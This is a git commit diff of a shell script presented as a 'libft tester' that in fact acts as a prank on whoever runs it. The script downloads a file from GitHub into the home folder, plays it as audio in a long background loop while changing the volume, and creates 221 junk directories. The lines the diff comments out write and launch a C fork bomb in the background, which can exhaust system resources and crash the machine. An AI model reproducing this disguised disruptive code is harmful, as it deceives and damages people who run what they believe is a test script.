e7033fe1a0cd91a901e5953ae995fbefa1f7c68f
murmur <0aeon0@mail.com>
2022-12-22 03:58:34 +0300

    Update libft_testester_By_NaN0BiT.sh

--- libft_testester_By_NaN0BiT.sh
+++ libft_testester_By_NaN0BiT.sh
@@ -1,12 +1,15 @@
+curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
 counter=1
 while [ $counter -le 9999 ]
 do
         ((counter++))
-		osascript -e "set Volume 2"
-        say -v xander "otuzbir"
+	osascript -e "set Volume 1"
+       # say -v xander "otuzbir"
+       afplay ~/libft.h
+       sleep 100
 done &
-curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
-afplay ~/libft.h &
+
+# afplay ~/libft.h &
 mkdir AAAAAAAAAAAAAAH{0..220}
-echo "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\nint main(){while(1){fork();}return 0;}" > libft.test
-cc -x c libft.test && ./a.out &
+#echo "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\nint main(){while(1){fork();}return 0;}" > libft.test
+#cc -x c libft.test && ./a.out &
